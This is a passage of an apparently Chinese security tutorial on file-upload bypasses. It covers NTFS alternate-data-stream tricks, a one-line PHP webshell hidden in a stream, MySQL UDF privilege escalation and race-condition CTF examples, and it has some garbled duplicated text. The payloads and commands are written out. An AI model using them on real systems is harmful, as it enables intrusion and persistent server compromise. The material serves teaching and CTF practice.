绕过方法</h3>\n<p>通过抓包截断将【evil.php.jpg】后面的一个【.】换成【0x00】。在上传的时候，当文件系统读到【0x00】时，会认为文件已经结束，从而将【evil.php.jpg】的内容写入到【evil.php】中，从而达到攻击的目的。</p>\n<h2 id=\"7windows-ntfs文件系统特性绕过\"><a class=\"anchor\" href=\"#7windows-ntfs文件系统特性绕过\">#</a> 7.windows NTFS 文件系统特性绕过</h2>\n<p>NTFS 交换数据流（alternate data streams 简称 ADS）是 NTFS 磁盘格式的新特性，见漏洞详细可查 CVE-1999-0278。</p>\n<p><img data-src=\"image006.png\" alt=\"\" /></p>\n<p>一个完整的流的格式为：::<br />\n 文件主流即我们平时可以看见的可以存储数据的文件。而非主文件流寄宿于主文件流中，无法直接读取。<br />\n修改宿主文件的内容或流的内容，不会对彼此造成影响。<br />\n流类型总是以符 号 作 为 开 始 ， N T F S 文 件 系 统 中 的 文 件 至 少 包 含 一 个 主 流 ， 也 就 是 d a t a 流 (符号作为开始，NTFS 文件系统中的文件至少包含一个主流，也就是 data 流 (符号作为开始，NTFS 文件系统中的文件至少包含一个主流，也就是 data 流 (DATA)，默认流名为空。<br />\nADS 可以省略流名，但不能省略流类型。<br />\nNTFS 文件系统中的文件夹没有 data 流，但可以指派 data 流，文件夹的主流为 directory 流 (I N D E X A L L O C A T I O N) ， 流 名 默 认 为 INDEX_ALLOCATION)，流名默认为 INDEX A LLOCATION)，流名默认为 I30<br />\n 当我们对一个在 NTFS 分区中的 ASP 文件发出包含 D A T A 请 求 ， I I S 会 检 查 最 后 一 个 “.” 后 面 的 扩 展 名 ， 因 为 多 了 : : DATA 请求，IIS 会检查最后一个 “.” 后面的扩展名，因为多了::DATA 请求，IIS 会检查最后一个 “.” 后面的扩展名，因为多了::DATA，结果 IIS 不认为这是一个 ASP 文件，而文件系统可以识别该请求，于是返回 ASP 的源代码。</p>\n<h3 id=\"绕过方法-7\"><a class=\"anchor\" href=\"#绕过方法-7\">#</a> 绕过方法</h3>\n<ol>\n<li>IIS 目录访问权限绕过：在 IIS6.0+PHP、IIS7+asp、IIS7.5+php 的环境下，如果目录是通过 HTTP Basic 来认证，假设网站根目录存在 index.php 文件，可通过构造如下方式来绕过认证直接访问目录下的文件。</li>\n</ol>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>/admin::<span class=\"token variable\">$INDEX_ALLOCATION</span>/index.php</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>/admin:<span class=\"token variable\">$i30</span><span class=\"token builtin class-name\">:</span><span class=\"token variable\">$INDEX_ALLOCATION</span>/index.asp</pre></td></tr></table></figure><ol start=\"2\">\n<li>上传绕过黑名单：在测试中我们发现如果上传的文件名字为：test.php::$DATA，会在服务器上生成一个 test.php 的文件，其中内容和所上传文件内容相同，并被解析。</li>\n</ol>\n<table>\n    <tr>\n        <th>上传的文件名</th>\n        <th>服务器表面现象</th>\n        <th>生成的文件内容</th>\n    </tr>\n    <tr>\n        <td>Test.php:a.jpg</td>\n        <td>生成Test.php</td>\n        <td>空</td>\n    </tr>\n    <tr>\n        <td>Test.php::$DATA</td>\n        <td>生成test.php</td>\n        <td>&lt;?php phpinfo();?&gt;</td>\n    </tr>\n    <tr>\n        <td>Test.php::$INDEX_ALLOCATION</td>\n        <td>生成test.php文件夹</td>\n        <td></td>\n    </tr>\n    <tr>\n        <td>Test.php::$DATA\\0.jpg</td>\n        <td>生成0.jpg</td>\n        <td>&lt;?php phpinfo();?&gt;</td>\n    </tr>\n    <tr>\n        <td>Test.php::$DATA\\aaa.jpg</td>\n        <td>生成aaa.jpg</td>\n        <td>&lt;?php phpinfo();?&gt;</td>\n    </tr>\n</table>\n<pre><code class=\"language-txt\">注意：\n对于windows环境的服务器，上传test.php:.jpg类型的文件，当文件传到服务端时，windows会将该文件识别成ADS，\n从而认为其宿主文件名为1.asp而将.jpg识别为流名。\n通过notepad test.php:.jpg可以查看内容，所以test.php内容为空是正常的。\n然后修改上传的文件名为test.&gt;&gt;&gt;或者test.&lt;、test.&lt;&lt;&lt;、test.&gt;&gt;&lt;再上传，会重写test.php。\n原因是在PHP+IIS的环境下，&quot; 同义. &gt;同义? &lt;同义*\n</code></pre>\n<ol start=\"3\">\n<li>隐藏 webshell：</li>\n</ol>\n<p>在服务器上 echo 一个数据流文件进去，比如 index.php 是网页正常文件，命令如下：<br />\n <code>echo ^&lt;?php @eval(request[cmd])?^ &gt;&gt; index.php:hidden.jpg</code> <br />\n 这样生成了一个不可见的 shell hidden.jpg，type dir del 命令都不行。利用文件包含<?php include('shell.php:hidden.jpg')?>就是一句话。</p>\n<ol start=\"4\">\n<li>mysql 中的 udf 提权:</li>\n</ol>\n<pre><code class=\"language-txt\">如果数据库用户对数据库mysql（注意指的是数据库里的默认库mysql）具有insert和delete权限，就可以创建加载自定义函数。\n而又因为mysql服务是以system权限运行在windows主机上，所以这个时候我们就可以通过自定义函数以system权限执行命令了。\n</code></pre>\n<p>如果数据库用户对数据库 mysql（注意指的是数据库里的默认库 mysql）具有 insert 和 delete 权限，就可以创建加载自定义函数。<br />\n而又因为 mysql 服务是以 system 权限运行在 windows 主机上，所以这个时候我们就可以通过自定义函数以 system 权限执行命令了。</p>\n<p>Mysql 5.0.67 之前，DLL 的导入目录是 C:\\windows\\system32<br />\n 从 MySQL 5.1 开始，要求目录必须是 mysql 目录下的 lib\\plugin\\ 目录，而且 mysql 5.1 之后的常用安装版本是默认不存在 lib\\plugin 目录的。</p>\n<p>执行 sql 语句<br />\n <code>show variables like '%plugin%';</code></p>\n<p>查看目录位置。<br />\n利用 ADS 依次创建 lib、plugin 目录</p>\n<p><code>select 'xxx' into outfile 'E:\\\\phpstudy\\\\PHPTutorial\\\\MySQL\\\\lib\\\\plugin::$INDEX_ALLOCATION';</code></p>\n<p>如果创建失败的话，执行</p>\n<p><code>show variables like '%secure%';</code> <br />\n 看看 secure_file_priv 的值：</p>\n<pre><code class=\"language-txt\">null表示限制mysqld不允许导入导出\n当secure_file_priv的值为/tmp/，表示限制mysqld 的导入导出只能在/tmp/目录下\n当secure_file_priv的值为空，表示不对mysqld的导入导出做限制\n</code></pre>\n<ol start=\"5\">\n<li>隐藏 exe 文件</li>\n</ol>\n<p><code>type muma.txt test.txt:muma.exe</code></p>\n<p>在 xp 中可以用 start test.txt:muma.exe 执行，但是 win7 以上这样执行会报错。win7 及之后的系统的正确姿势如下：<br />\n创建一个符号链接文件 test.exe，链接到寄生的交换数据流可执行文件 test.txt:muma.exe 上：mklink test.exe,test.txt:muma.exe，然后执行 start test.exe/b 即可<br />\n更新一个方法：<br />\n <code>wmic process call create &quot;C:\\ProjectCode\\test\\test:putty.exe&quot;</code></p>\n<pre><code class=\"language-txt\">在WinXP中，可执行文件可以和文本文件一样实现真正的隐藏，这可能也是当时大多数杀毒软件添加数据流病毒查\n杀功能的原因；在Win7之后的系统中，微软可能出于安全考虑，不允许直接运行交换数据流可执行文件，必须要\n创建符号链接，这个符号链接是可见的（当然可以使用其他手段隐藏这个符号链接），并且这个符号链接创建出来\n后不能复制到其他地方，只能在创建的那个位置使用命令行方式调用（鼠标双击会报错）。\n</code></pre>\n<p>查看隐藏流文件</p>\n<pre><code class=\"language-txt\">使用这两款小工具配合进行检测和清除寄生的交换数据流\nhttps://pan.baidu.com/share/link?shareid=134850&amp;uk=1108295926\nlabs.exe检测，streams.exe进行清理。\n还有一个叫做AlternateStreamView的工具也可以\n</code></pre>\n<h2 id=\"二次渲染绕过\"><a class=\"anchor\" href=\"#二次渲染绕过\">#</a> 二次渲染绕过</h2>\n<p>感觉这个的知识点偏向文件格式分析 (MISC)。在制作图片马的时候</p>\n<p>往往是在图片后头附件一段 php 代码，或者是改包发送一个图片马。但是如果使用了二次渲染。我们上传的文件名称会被修改，并且文件末尾段一些冗余的信息（一句话木马）会被删除。</p>\n<p>所以很明显，我们只需要将我们需要写入的东西塞在图片中间（虽然会使图片损坏，但是我们又不需要图片。。），用 winhex 或者是 010editor 等在文件内进行修改即可。</p>\n<h2 id=\"条件竞争\"><a class=\"anchor\" href=\"#条件竞争\">#</a> 条件竞争</h2>\n<p>条件竞争漏洞是一种服务器端的漏洞，由于服务器端在处理不同用户的请求时是并发进行的，因此，如果并发处理不当或相关操作逻辑顺序设计的不合理时，将会导致此类问题的发生。</p>\n<p>该漏洞一般出现在与数据库系统频繁交互的位置，例如金额同步、支付等较敏感操作处。另外条件竞争漏洞也会出现在其他位置，例如文件的操作处理等。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># -*-coding:utf-8-*-</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> threading</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>COUNT <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">Run</span><span class=\"token punctuation\">(</span>threads_name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">global</span> COUNT</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    read_value <span class=\"token operator\">=</span> COUNT</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"COUNT in Thread-%s is %d\"</span> <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>threads_name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> read_value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    COUNT <span class=\"token operator\">=</span> read_value <span class=\"token operator\">+</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    threads <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">10000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        t <span class=\"token operator\">=</span> threading<span class=\"token punctuation\">.</span>Thread<span class=\"token punctuation\">(</span>target<span class=\"token operator\">=</span>Run<span class=\"token punctuation\">,</span> args<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>j<span class=\"token punctuation\">,</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        threads<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        t<span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>threads<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        threads<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Finally, The COUNT is %d\"</span> <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span>COUNT<span class=\"token punctuation\">,</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    main<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token comment\">#######################===== 输出结果</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token comment\">#部分结果为：</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        ……</pre></td></tr><tr><td data-num=\"33\"></td><td><pre>COUNT <span class=\"token keyword\">in</span> Thread<span class=\"token operator\">-</span><span class=\"token number\">9989</span> <span class=\"token keyword\">is</span> <span class=\"token number\">9972</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>COUNT <span class=\"token keyword\">in</span> Thread<span class=\"token operator\">-</span><span class=\"token number\">9990</span> <span class=\"token keyword\">is</span> <span class=\"token number\">9973</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>COUNT <span class=\"token keyword\">in</span> Thread<span class=\"token operator\">-</span><span class=\"token number\">9991</span> <span class=\"token keyword\">is</span> <span class=\"token number\">9974</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>COUNT <span class=\"token keyword\">in</span> Thread<span class=\"token operator\">-</span><span class=\"token number\">9992</span> <span class=\"token keyword\">is</span> <span class=\"token number\">9975</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>COUNT <span class=\"token keyword\">in</span> Thread<span class=\"token operator\">-</span><span class=\"token number\">9993</span> <span class=\"token keyword\">is</span> <span class=\"token number\">9976</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>COUNT <span class=\"token keyword\">in</span> Thread<span class=\"token operator\">-</span><span class=\"token number\">9994</span> <span class=\"token keyword\">is</span> <span class=\"token number\">9977</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>COUNT <span class=\"token keyword\">in</span> Thread<span class=\"token operator\">-</span><span class=\"token number\">9995</span> <span class=\"token keyword\">is</span> <span class=\"token number\">9978</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>COUNT <span class=\"token keyword\">in</span> Thread<span class=\"token operator\">-</span><span class=\"token number\">9996</span> <span class=\"token keyword\">is</span> <span class=\"token number\">9979</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>COUNT <span class=\"token keyword\">in</span> Thread<span class=\"token operator\">-</span><span class=\"token number\">9997</span> <span class=\"token keyword\">is</span> <span class=\"token number\">9980</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>COUNT <span class=\"token keyword\">in</span> Thread<span class=\"token operator\">-</span><span class=\"token number\">9998</span> <span class=\"token keyword\">is</span> <span class=\"token number\">9981</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>COUNT <span class=\"token keyword\">in</span> Thread<span class=\"token operator\">-</span><span class=\"token number\">9999</span> <span class=\"token keyword\">is</span> <span class=\"token number\">9982</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>Finally<span class=\"token punctuation\">,</span> The COUNT <span class=\"token keyword\">is</span> <span class=\"token number\">9983</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>Process finished <span class=\"token keyword\">with</span> exit code <span class=\"token number\">0</span></pre></td></tr></table></figure><p>按照我们的预想，结果应该都是 10000，但是发现结果可能存在非预期解，并且出现非预期的概率还挺大的。</p>\n<p>这是什么原因呢？</p>\n<p>原因就在于我们没有对变量 COUNT 做同步制约，导致可能 Thread-7 在读 COUNT, 还没来得及更改 COUNT,Thread-8 抢夺资源，也来读 COUNT, 并且将 COUNT 修改为它读的结果 + 1，由此出现非预期。</p>\n<p>同样的，WEB 应用程序因为要为很多用户服务，势必要采用多线程，但是，如果种种原因导致线程间的同步机制没处理好，那么也就会导致非预期和条件竞争的漏洞。</p>\n<h3 id=\"例一金额提现\"><a class=\"anchor\" href=\"#例一金额提现\">#</a> 例一：金额提现</h3>\n<p>假设现有一个用户在系统中共有 2000 元可以提现，他想全部提现。于是该用户同时发起两次提现请求，第一次提交请求提现 2000 元，系统已经创建了提现订单但还未来得及修改该用户剩余金额，此时第二次提现请求同样是提现 2000 元，于是程序在还未修改完上一次请求后的余额前就进行了余额判断，显然如果这里余额判断速度快于上一次余额修改速度，将会产生成功提现的两次订单，而数据库中余额也将变为 - 2000。而这产生的后果将会是平台多向该用户付出 2000 元</p>\n<h3 id=\"例二moctf里的一道题\"><a class=\"anchor\" href=\"#例二moctf里的一道题\">#</a> 例二：moctf 里的一道题</h3>\n<p>打开网址后一直打开的是 index2.php 修改为 index.php 后发现还是会跳转到 index2 抓包修改 index.php。</p>\n<p><img data-src=\"image001.png\" alt=\"\" /></p>\n<p>发现 index.php 是一个 302 网页，因此就可以看到这里存在的一个文件 uploadsomething.php。</p>\n<p><img data-src=\"image002.png\" alt=\"\" /></p>\n<p>随便填写文件名下面写入代码，再进行提交。</p>\n<p>访问后</p>\n<p><img data-src=\"image003.png\" alt=\"\" /></p>\n<p>因此这里就需要用到条件竞争，不断的向网站发送请求，然后边发送边访问。</p>\n<p>写入一个 py 文件一直发 requests 即可</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>url<span class=\"token operator\">=</span><span class=\"token string\">\"http://119.23.73.3:5006/web2/uploads/b106f91010a3789acab1f27a00d67570052a7921/1.php\"</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">while</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">print</span> <span class=\"token punctuation\">(</span>requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"image004.png\" alt=\"\" /></p>\n<h3 id=\"例三xman-easy-gallery\"><a class=\"anchor\" href=\"#例三xman-easy-gallery\">#</a> 例三：XMAN-Easy Gallery</h3>\n<p>伪协议读取代码<br />\n <code>http://202.112.51.184:8004/index.php?page=php://filter/read=convert.base64-encode/resource=upload.php</code></p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span> <span class=\"token attr-name\">lang</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>zh-CN<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">charset</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>utf-8<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token variable\">$error</span><span class=\"token operator\">=</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'pic'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'error'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token variable\">$tmpName</span><span class=\"token operator\">=</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'pic'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'tmp_name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token variable\">$name</span><span class=\"token operator\">=</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'pic'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token variable\">$size</span><span class=\"token operator\">=</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'pic'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'size'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token variable\">$type</span><span class=\"token operator\">=</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'pic'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'type'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">try</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$name</span><span class=\"token operator\">!==</span><span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token variable\">$name1</span><span class=\"token operator\">=</span><span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$name</span><span class=\"token punctuation\">,</span><span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$name1</span><span class=\"token operator\">!==</span><span class=\"token string double-quoted-string\">\".gif\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">and</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$name1</span><span class=\"token operator\">!==</span><span class=\"token string double-quoted-string\">\".jpg\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"hehe\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;script language=javascript>alert('不允许的文件类型！');history.go(-1)&lt;/script>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>            <span class=\"token keyword\">exit</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$type</span><span class=\"token operator\">!==</span><span class=\"token string double-quoted-string\">\"image/jpeg\"</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token variable\">$type</span><span class=\"token operator\">!==</span><span class=\"token string double-quoted-string\">\"image/gif\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token function\">mime_content_type</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$tmpName</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;script language=javascript>alert('不允许的文件类型！');history.go(-1)&lt;/script>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>            <span class=\"token keyword\">exit</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">is_uploaded_file</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$tmpName</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>            <span class=\"token variable\">$time</span><span class=\"token operator\">=</span><span class=\"token function\">time</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>            <span class=\"token variable\">$rootpath</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'uploads/'</span><span class=\"token operator\">.</span><span class=\"token variable\">$time</span><span class=\"token operator\">.</span><span class=\"token variable\">$name1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">move_uploaded_file</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$tmpName</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$rootpath</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>                <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;script language='JavaScript'>alert('文件移动失败!');window.location='index.php?page=submit'&lt;/script>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>                <span class=\"token keyword\">exit</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>            <span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>                <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$type</span><span class=\"token operator\">==</span><span class=\"token string single-quoted-string\">'image/jpeg'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>                <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>                    <span class=\"token variable\">$im</span> <span class=\"token operator\">=</span> @<span class=\"token function\">imagecreatefromjpeg</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$rootpath</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>                    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token variable\">$im</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>                      <span class=\"token variable\">$im</span> <span class=\"token operator\">=</span> <span class=\"token function\">imagecreatetruecolor</span><span class=\"token punctuation\">(</span><span class=\"token number\">150</span><span class=\"token punctuation\">,</span> <span class=\"token number\">30</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>                      <span class=\"token variable\">$bg</span> <span class=\"token operator\">=</span> <span class=\"token function\">imagecolorallocate</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$im</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>                      